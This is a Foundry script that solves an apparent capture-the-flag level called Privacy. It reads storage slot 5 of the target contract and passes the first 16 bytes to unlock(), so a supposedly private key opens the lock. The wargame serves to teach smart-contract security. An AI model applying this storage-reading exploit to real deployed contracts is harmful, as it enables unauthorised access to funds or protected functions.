pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import {VmSafe} from "forge-std/Vm.sol";
import {Privacy} from "../src/Level12.sol";

contract Level12Script is Script {
    function run() public {
        VmSafe.Wallet memory wallet = vm.createWallet(vm.envUint("PRIVATE_KEY"));

        address payable contractAddress = payable(vm.envAddress("CONTRACT"));

        vm.startBroadcast(wallet.privateKey);
        exploit(contractAddress);
        vm.stopBroadcast();

        require(levelDone(contractAddress), "Solution failed");
    }

    function exploit(address _target) private {
        bytes32 slotContent = vm.load(_target, bytes32(uint256(5)));
        Privacy(_target).unlock(bytes16(slotContent));
    }

    function levelDone(address _target) private view returns (bool) {
        return !Privacy(_target).locked();
    }
}
